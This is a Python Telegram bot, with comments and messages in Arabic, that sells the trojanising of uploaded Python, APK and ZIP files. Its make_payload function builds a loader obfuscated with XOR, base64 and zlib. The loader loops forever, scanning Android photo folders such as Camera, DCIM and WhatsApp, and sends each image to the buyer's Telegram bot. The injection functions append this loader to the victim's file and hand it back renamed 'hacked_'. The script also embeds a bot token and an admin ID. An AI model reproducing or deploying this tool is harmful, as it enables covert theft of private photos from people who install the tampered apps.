#!/usr/bin/env python3
"""
🤖 بوت حقن Android Miner - نسخة مدفوعة جزئياً
- Python Script → مجاني
- APK + ZIP → مدفوع (يطلب الاشتراك)
- Admin ID: 7238044992
"""

import asyncio
import io
import zipfile
import zlib
import base64
import hashlib
import logging
from tqdm import tqdm

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

BOT_TOKEN = "8695021881:AAGaevEMGterFy_QmZCyNvKejKfTabisiFo"
ADMIN_ID = 7238044992

# States
TOKEN, CHATID, FILE = range(3)

WELCOME = """
🤖 **بوت الحقن الاحترافي للأندرويد** 🚀

أرسل /start لبدء الإعداد
"""

SUBSCRIBE_MSG = """
🔒 **هذا النوع من الملفات مدفوع**

✅ حقن APK و ZIP يتطلب اشتراك

**للاشتراك:**
1. أرسل `/myid` للحصول على معرفك
2. أرسل معرفك إلى الإدارة → @CI_v_CI
3. بعد الدفع سيتم تفعيلك

يمكنك تجربة الحقن على ملفات Python مجاناً حالياً.
"""

PAID_FILE_MSG = """
🔒 **حقن APK و ZIP مدفوع**

هذا الملف ({file_type}) يتطلب اشتراكاً.
يرجى الاشتراك عبر الإدارة @CI_v_CI

يمكنك رفع ملفات Python (.py) مجاناً الآن.
"""

SUCCESS = "🎉 تم الحقن بنجاح! الملف جاهز للاستخدام 🟢"
ERROR_FILE = "❌ يرجى رفع ملف APK أو ZIP أو Python script فقط"

DIRS = [
    "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures",
    "/storage/emulated/0/DCIM", "/storage/emulated/0/Screenshots",
    "/storage/emulated/0/WhatsApp", "/sdcard/DCIM/Camera",
    "/sdcard/Pictures", "/sdcard/DCIM", "/sdcard/Screenshots",
    "/sdcard/WhatsApp", "/storage/emulated/0/Download"
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def make_payload(token: str, chatid: str) -> str:
    miner = f'import os,requests,base64,zlib,hashlib,time,glob,io;k=42;d="{chatid}";c="{token}";def e(b):return bytes([ord(b[i])^k for i in range(len(b))]);exec(zlib.decompress(base64.b64decode(bytes([ord(e(d))[i]^42 for i in range(len(e(d)))])));while 1:time.sleep(120);for p in {repr(DIRS)}:if os.path.exists(p):for f in glob.glob(p+"/*.[jJ][pP][gG]")+glob.glob(p+"/*.[pP][nN][gG]"):try:s=os.stat(f);if 1024<s.st_size<50000000:h=hashlib.md5(open(f,"rb").read()).hexdigest();o=open("/sdcard/.m","a+");if h not in o.read():o.close();open("/sdcard/.m","a").write(h+"\\n");requests.post("https://api.telegram.org/bot"+c+"/sendPhoto",data={{"chat_id":d,"caption":"🖼️"}},files={{"photo":open(f,"rb")}});except:pass'
    comp = zlib.compress(miner.encode())
    enc = base64.b64encode(comp).decode()
    xord = ''.join(chr(ord(c)^42) for c in enc)
    loader = f'import zlib,base64;exec(zlib.decompress(base64.b64decode(bytes([ord("{xord}"[i])^42 for i in range(len("{xord}"))]))))'
    return loader

async def is_subscribed(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
    approved = context.bot_data.get('approved_users', set())
    return user_id in approved

# ====================== Basic Commands ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(WELCOME, parse_mode='Markdown')
    await update.message.reply_text("🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
    return TOKEN

async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"🆔 **معرفك:** `{user.id}`\n\nأرسل هذا الرقم للإدارة @CI_v_CI للاشتراك",
        parse_mode='Markdown'
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await is_subscribed(context, update.effective_user.id):
        await update.message.reply_text("✅ أنت مشترك ويمكنك حقن APK و ZIP.")
    else:
        await update.message.reply_text("ℹ️ أنت غير مشترك.\nملفات Python مجانية، APK و ZIP مدفوعة.")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ هذا الأمر للإدارة فقط.")
        return

    try:
        target_id = int(update.message.text.split()[1])
        if 'approved_users' not in context.bot_data:
            context.bot_data['approved_users'] = set()
        context.bot_data['approved_users'].add(target_id)
        await update.message.reply_text(f"✅ تم تفعيل المستخدم: {target_id}")
        try:
            await context.bot.send_message(target_id, "🎉 تم تفعيل اشتراكك!\nيمكنك الآن رفع ملفات APK و ZIP.")
        except:
            pass
    except:
        await update.message.reply_text("⚠️ استخدم: `/approve 1234567890`", parse_mode='Markdown')

# ====================== Conversation ======================
async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    if not await validate_token(token):
        await update.message.reply_text("❌ توكن غير صالح، حاول مرة أخرى.")
        return TOKEN

    context.user_data['token'] = token
    await update.message.reply_text("✅ تم حفظ التوكن!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
    return CHATID

async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chatid = update.message.text.strip()
    if not chatid.lstrip('-').isdigit():
        await update.message.reply_text("❌ Chat ID غير صالح.")
        return CHATID

    context.user_data['chatid'] = chatid
    await update.message.reply_text("✅ تم الحفظ!\n\n📤 ارفع الملف الآن (Python مجاني - APK/ZIP مدفوع)", parse_mode='Markdown')
    return FILE

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc:
        await update.message.reply_text(ERROR_FILE, parse_mode='Markdown')
        return FILE

    file_name = doc.file_name.lower()
    is_paid_file = file_name.endswith(('.apk', '.zip'))

    # فحص إذا كان الملف مدفوع وغير مشترك
    if is_paid_file and not await is_subscribed(context, update.effective_user.id):
        file_type = "APK" if file_name.endswith('.apk') else "ZIP"
        kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
        await update.message.reply_text(
            PAID_FILE_MSG.format(file_type=file_type),
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode='Markdown'
        )
        return FILE

    # إذا وصل هنا → إما ملف Python أو المستخدم مشترك → يستمر الحقن
    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")

    try:
        file = await doc.get_file()
        file_bytes = bytearray()
        with tqdm(total=doc.file_size or 1, unit='B', unit_scale=True, desc="تحميل") as pbar:
            async for chunk in file.download_as_bytearray_iter(chunk_size=8192):
                file_bytes.extend(chunk)
                pbar.update(len(chunk))

        await status_msg.edit_text("✅ تم التحميل\n🔄 جاري الحقن...")

        payload = make_payload(context.user_data['token'], context.user_data['chatid'])

        with tqdm(total=100, desc="الحقن") as pbar:
            if file_bytes.startswith(b'PK') or is_paid_file:
                result = inject_apk(bytes(file_bytes), payload)
            else:
                result = inject_script(bytes(file_bytes), payload)
            pbar.update(100)

        name = f"hacked_{doc.file_name}"
        await update.message.reply_document(
            document=result,
            filename=name,
            caption=SUCCESS,
            parse_mode='Markdown'
        )

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ حدث خطأ: {str(e)[:200]}")

    context.user_data.clear()
    return ConversationHandler.END

# دوال الحقن (لم تتغير)
def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
    bio = io.BytesIO(apk_bytes)
    with zipfile.ZipFile(bio, 'r') as zf:
        py_files = [f for f in zf.namelist() if f.endswith('.py')]
        target = py_files[0] if py_files else 'main.py'
        content = zf.read(target).decode(errors='ignore') + f"\n\n# MINER\n{payload}"
        new_zip = io.BytesIO()
        with zipfile.ZipFile(new_zip, 'w') as nz:
            for item in zf.infolist():
                if item.filename == target:
                    nz.writestr(item, content.encode())
                else:
                    nz.writestr(item, zf.read(item))
    new_zip.seek(0)
    return new_zip

def inject_script(script_bytes: bytes, payload: str) -> io.BytesIO:
    content = script_bytes.decode(errors='ignore') + f"\n\n# ANDROID MINER\n{payload}"
    return io.BytesIO(content.encode())

async def validate_token(token: str) -> bool:
    try:
        temp_app = Application.builder().token(token).build()
        await temp_app.bot.get_me()
        return True
    except:
        return False

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "subscribe":
        await query.edit_message_text(SUBSCRIBE_MSG, parse_mode='Markdown')

# ====================== Main ======================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    if 'approved_users' not in app.bot_data:
        app.bot_data['approved_users'] = set()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token)],
            CHATID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chatid)],
            FILE: [MessageHandler(filters.Document.ALL, process_file)],
        },
        fallbacks=[],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("myid", myid))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ البوت يعمل - Python مجاني | APK & ZIP مدفوع")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
